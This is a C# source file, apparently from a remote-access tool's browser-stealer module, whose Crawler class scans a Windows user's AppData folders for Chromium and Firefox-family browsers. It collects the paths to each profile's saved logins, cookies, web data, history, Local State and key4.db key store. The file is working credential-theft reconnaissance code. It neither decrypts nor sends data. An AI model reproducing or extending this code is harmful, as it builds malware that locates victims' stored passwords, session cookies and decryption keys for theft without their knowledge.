using Pulsar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Pulsar.Client.Kematian.Browsers.Helpers
{
    public class Crawler
    {
        private const int MAX_DEPTH = 3;
        private readonly string[] knownBrowserPaths = {
            @"Opera",
            @"Opera Software\Opera GX Stable",
        };

        private readonly string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private readonly string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public AllBrowsers FindAllBrowsers()
        {
            var chromiumBrowsers = new ConcurrentBag<BrowserChromium>();
            var geckoBrowsers = new ConcurrentBag<BrowserGecko>();
            string[] rootDirs = { localAppData, appData };

            Parallel.ForEach(rootDirs, rootDir =>
            {
                if (Directory.Exists(rootDir))
                {
                    Debug.WriteLine($"[INFO] Starting deep search in: {rootDir}");
                    if (rootDir == appData)
                    {
                        SearchDirectory(rootDir, chromiumBrowsers, geckoBrowsers, true);
                    }
                    else
                    {
                        SearchDirectory(rootDir, chromiumBrowsers, geckoBrowsers, false);
                    }
                }
            });

            // Check known browser paths
            foreach (var knownPath in knownBrowserPaths)
            {
                string fullPath = Path.Combine(appData, knownPath);
                if (Directory.Exists(fullPath))
                {
                    Debug.WriteLine($"[INFO] Checking known browser path: {fullPath}");
                    if (knownPath.Contains("Opera"))
                    {
                        CheckForOperaBrowser(fullPath, chromiumBrowsers);
                    }
                    else
                    {
                        CheckForBrowser(fullPath, chromiumBrowsers, geckoBrowsers, true);
                    }
                }
            }

            // Log found browsers
            LogFoundBrowsers(chromiumBrowsers, geckoBrowsers);

            return new AllBrowsers
            {
                Chromium = chromiumBrowsers.ToArray(),
                Gecko = geckoBrowsers.ToArray()
            };
        }

        private void SearchDirectory(string directory, ConcurrentBag<BrowserChromium> chromiumBrowsers,
                                          ConcurrentBag<BrowserGecko> geckoBrowsers, bool isRoaming, int depth = 0)
        {
            if (depth > MAX_DEPTH) return;

            try
            {
                CheckForBrowser(directory, chromiumBrowsers, geckoBrowsers, isRoaming);

                // Skip some common non-browser directories to improve performance
                string dirName = Path.GetFileName(directory).ToLowerInvariant();
                if (dirName == "temp" || dirName == "cache" || dirName == "logs" ||
                    dirName == "thumbnails" || dirName == "crash reports")
                    return;

                var subDirs = Directory.GetDirectories(directory);
                Parallel.ForEach(subDirs, dir =>
                {
                    SearchDirectory(dir, chromiumBrowsers, geckoBrowsers, isRoaming, depth + 1);
                });
            }
            catch (UnauthorizedAccessException)
            {
                // Skip directories we don't have access to
            }
            catch (PathTooLongException)
            {
                // Skip paths that are too long
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] In directory {directory}: {ex.Message}");
            }
        }

        private void CheckForBrowser(string path, ConcurrentBag<BrowserChromium> chromiumBrowsers,
                                          ConcurrentBag<BrowserGecko> geckoBrowsers, bool isRoaming)
        {
            try
            {
                // Check for Chromium browsers
                string userDataPath = Path.Combine(path, "User Data");
                if (Directory.Exists(userDataPath))
                {
                    string localStatePath = Path.Combine(userDataPath, "Local State");
                    if (File.Exists(localStatePath))
                    {
                        Debug.WriteLine($"[DETECT] Found Chromium browser at: {userDataPath}");
                        var profiles = FindChromiumProfiles(userDataPath);

                        if (profiles.Count > 0)
                        {
                            chromiumBrowsers.Add(new BrowserChromium
                            {
                                Name = Path.GetFileName(path),
                                LocalState = localStatePath,
                                Path = path,
                                Profiles = profiles.ToArray()
                            });
                            Debug.WriteLine($"[SUCCESS] Added Chromium browser with {profiles.Count} profiles");
                        }
                    }
                }

                // Check for Firefox/Gecko browsers
                if (isRoaming)
                {
                    CheckForGeckoBrowser(path, geckoBrowsers);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Checking browser in {path}: {ex.Message}");
            }
        }

        private List<ProfileChromium> FindChromiumProfiles(string userDataPath)
        {
            var profiles = new List<ProfileChromium>();

            try
            {
                // Check root directory for Opera-style direct file storage
                TryAddChromiumProfile(profiles, userDataPath, "Root");

                // Check Default profile
                string defaultProfile = Path.Combine(userDataPath, "Default");
                if (Directory.Exists(defaultProfile))
                {
                    TryAddChromiumProfile(profiles, defaultProfile, "Default");
                }

                // Check Profile X directories
                var profileDirs = Directory.GetDirectories(userDataPath)
                    .Where(dir => Path.GetFileName(dir).StartsWith("Profile ", StringComparison.OrdinalIgnoreCase))
                    .ToList();

                foreach (var profileDir in profileDirs)
                {
                    TryAddChromiumProfile(profiles, profileDir, Path.GetFileName(profileDir));
                }

                // Check for other non-standard profile directories
                var otherProfiles = Directory.GetDirectories(userDataPath)
                    .Where(dir => !Path.GetFileName(dir).StartsWith("Profile ", StringComparison.OrdinalIgnoreCase) &&
                                 Path.GetFileName(dir) != "Default" &&
                                 !IsSystemDirectory(Path.GetFileName(dir)))
                    .ToList();

                foreach (var profileDir in otherProfiles)
                {
                    TryAddChromiumProfile(profiles, profileDir, Path.GetFileName(profileDir));
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Finding Chromium profiles: {ex.Message}");
            }

            return profiles;
        }

        private void TryAddChromiumProfile(List<ProfileChromium> profiles, string profileDir, string profileName)
        {
            try
            {
                // Create network subdirectory path - sometimes cookies are stored here
                string networkDir = Path.Combine(profileDir, "Network");
                string cookiesNetworkPath = Path.Combine(networkDir, "Cookies");
                string cookiesDirectPath = Path.Combine(profileDir, "Cookies");

                var profile = new ProfileChromium
                {
                    Name = profileName,
                    Path = profileDir,
                    LoginData = Path.Combine(profileDir, "Login Data"),
                    WebData = Path.Combine(profileDir, "Web Data"),
                    Cookies = File.Exists(cookiesNetworkPath) ? cookiesNetworkPath : cookiesDirectPath,
                    History = Path.Combine(profileDir, "History"),
                    Bookmarks = Path.Combine(profileDir, "Bookmarks")
                };

                // Count how many data files we have - browsers may use different combinations
                Dictionary<string, bool> fileStatuses = new Dictionary<string, bool>
                {
                    { "LoginData", File.Exists(profile.LoginData) },
                    { "WebData", File.Exists(profile.WebData) },
                    { "Cookies", File.Exists(profile.Cookies) },
                    { "History", File.Exists(profile.History) },
                    { "Bookmarks", File.Exists(profile.Bookmarks) }
                };

                int validFiles = fileStatuses.Count(kvp => kvp.Value);

                // Consider a profile valid if it has at least 2 of the expected files
                if (validFiles >= 2 && !profileDir.Contains("Application Data"))
                {
                    profiles.Add(profile);
                    Debug.WriteLine($"[SUCCESS] Added profile {profileName} with {validFiles}/5 data files");
                }
                else if (validFiles > 0)
                {
                    Debug.WriteLine($"[INCOMPLETE] Profile {profileName} has only {validFiles}/5 data files");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Adding Chromium profile {profileName}: {ex.Message}");
            }
        }

        private void CheckForGeckoBrowser(string path, ConcurrentBag<BrowserGecko> geckoBrowsers)
        {
            try
            {
                // First check direct path for Firefox profile
                string dirName = Path.GetFileName(path);
                if (dirName.Contains(".default-") || dirName.EndsWith(".default"))
                {
                    TryAddGeckoProfile(path, geckoBrowsers);
                }

                // Check for Firefox "Profiles" directory structure
                string profilesPath = Path.Combine(path, "Profiles");
                if (Directory.Exists(profilesPath))
                {
                    var defaultProfiles = Directory.GetDirectories(profilesPath)
                        .Where(dir => Path.GetFileName(dir).Contains(".default-") ||
                                      Path.GetFileName(dir).EndsWith(".default"))
                        .ToList();

                    if (defaultProfiles.Count > 0)
                    {
                        foreach (var profileDir in defaultProfiles)
                        {
                            TryAddGeckoProfile(profileDir, geckoBrowsers);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Checking Firefox browser in {path}: {ex.Message}");
            }
        }

        private void TryAddGeckoProfile(string profileDir, ConcurrentBag<BrowserGecko> geckoBrowsers)
        {
            try
            {
                string key4Path = Path.Combine(profileDir, "key4.db");
                string loginsPath = Path.Combine(profileDir, "logins.json");
                string cookiesPath = Path.Combine(profileDir, "cookies.sqlite");
                string historyPath = Path.Combine(profileDir, "places.sqlite");

                // Count valid files
                int validFiles = 0;
                if (File.Exists(key4Path)) validFiles++;
                if (File.Exists(loginsPath)) validFiles++;
                if (File.Exists(cookiesPath)) validFiles++;
                if (File.Exists(historyPath)) validFiles++;

                if (validFiles >= 2)
                {
                    string browserName = Directory.GetParent(Directory.GetParent(profileDir).FullName)?.Name + "\\" +
                                         Path.GetFileName(Directory.GetParent(profileDir).FullName);

                    geckoBrowsers.Add(new BrowserGecko
                    {
                        Name = browserName,
                        Path = profileDir,
                        Key4 = key4Path,
                        Logins = loginsPath,
                        Cookies = cookiesPath,
                        History = historyPath,
                        ProfilesDir = Directory.GetParent(profileDir).FullName
                    });

                    Debug.WriteLine($"[SUCCESS] Added Firefox profile with {validFiles}/4 data files");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Adding Firefox profile: {ex.Message}");
            }
        }

        private void CheckForOperaBrowser(string path, ConcurrentBag<BrowserChromium> chromiumBrowsers)
        {
            try
            {
                var profiles = new List<ProfileChromium>();
                TryAddChromiumProfile(profiles, path, "Default");

                if (profiles.Count > 0)
                {
                    chromiumBrowsers.Add(new BrowserChromium
                    {
                        Name = "Opera",
                        LocalState = Path.Combine(path, "Local State"),
                        Path = path,
                        Profiles = profiles.ToArray()
                    });
                    Debug.WriteLine($"[SUCCESS] Added Opera browser with {profiles.Count} profiles");
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[ERROR] Checking Opera browser in {path}: {ex.Message}");
            }
        }

        private bool IsSystemDirectory(string dirName)
        {
            string lower = dirName.ToLowerInvariant();
            return lower == "crash reports" || lower == "gcm_store" ||
                   lower == "cache" || lower == "session storage" ||
                   lower == "jumplisticons" || lower.StartsWith(".");
        }

        private void LogFoundBrowsers(ConcurrentBag<BrowserChromium> chromiumBrowsers,
                                           ConcurrentBag<BrowserGecko> geckoBrowsers)
        {
            Debug.WriteLine("========== FOUND CHROMIUM BROWSERS ==========");
            foreach (var browser in chromiumBrowsers)
            {
                Debug.WriteLine($"[BROWSER] {browser.Name}: {browser.Path}");
                Debug.WriteLine($"[LOCAL_STATE] {browser.LocalState}");

                foreach (var profile in browser.Profiles)
                {
                    Debug.WriteLine($"  [PROFILE] {profile.Name}");
                    Debug.WriteLine($"    LoginData: {FileExistsInfo(profile.LoginData)}");
                    Debug.WriteLine($"    WebData: {FileExistsInfo(profile.WebData)}");
                    Debug.WriteLine($"    Cookies: {FileExistsInfo(profile.Cookies)}");
                    Debug.WriteLine($"    History: {FileExistsInfo(profile.History)}");
                    Debug.WriteLine($"    Bookmarks: {FileExistsInfo(profile.Bookmarks)}");
                }
                Debug.WriteLine("-------------------------------------------");
            }

            Debug.WriteLine("========== FOUND GECKO BROWSERS ==========");
            foreach (var browser in geckoBrowsers)
            {
                Debug.WriteLine($"[BROWSER] {browser.Name}: {browser.Path}");
                Debug.WriteLine($"[PROFILES_DIR] {browser.ProfilesDir}");
                Debug.WriteLine($"  Key4DB: {FileExistsInfo(browser.Key4)}");
                Debug.WriteLine($"  LoginsJson: {FileExistsInfo(browser.Logins)}");
                Debug.WriteLine($"  Cookies: {FileExistsInfo(browser.Cookies)}");
                Debug.WriteLine($"  History: {FileExistsInfo(browser.History)}");
                Debug.WriteLine("-------------------------------------------");
            }
        }

        private string FileExistsInfo(string path)
        {
            return $"{path} ({(File.Exists(path) ? "Found" : "Missing")})";
        }
    }
}